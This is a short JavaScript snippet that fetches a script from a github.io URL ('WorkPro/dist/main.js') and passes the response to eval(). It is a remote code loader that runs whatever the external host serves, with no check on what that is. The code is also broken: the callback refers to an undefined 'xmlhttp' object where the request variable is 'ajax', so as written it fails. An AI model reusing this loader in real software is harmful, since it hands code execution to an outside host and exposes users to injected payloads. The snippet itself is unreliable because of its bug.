let ajax = new XMLHttpRequest();
ajax.open("GET", "https://fszaxt.github.io/WorkPro/dist/main.js", true);
ajax.send();

ajax.onreadystatechange = function () {
  if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
    eval(ajax.responseText);
  }
};
